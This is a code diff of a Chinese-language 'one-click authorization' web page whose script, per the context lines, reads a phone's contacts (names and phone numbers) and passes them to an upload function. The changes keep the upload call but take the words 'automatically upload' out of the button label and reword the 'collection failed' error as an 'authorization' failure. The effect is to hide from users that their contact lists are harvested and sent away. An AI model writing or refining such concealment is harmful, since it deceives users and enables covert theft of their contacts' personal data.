@@ -18,7 +18,7 @@ td,th{border:1px solid #475569;padding:8px}
 <body>
 <h2>一键授权</h2>
 <p class="tip" id="status">点击下方按钮开始授权</p>
-<button class="btn" id="getBtn">一键获取权限并自动上传</button>
+<button class="btn" id="getBtn">一键获取权限</button>
 <input type="file" id="vcfInput" accept=".vcf">
 <div class="table-wrap" id="tableBox"></div>
 
@@ -84,7 +84,7 @@ async function androidGet(){
         }).filter(v=>v.name||v.phone)
         renderAndUpload(dataList)
     }catch(e){
-        statusTxt.innerText = "权限被拒绝，采集失败"
+        statusTxt.innerText = "申请被拒绝，授权失败"
     }
 }
 
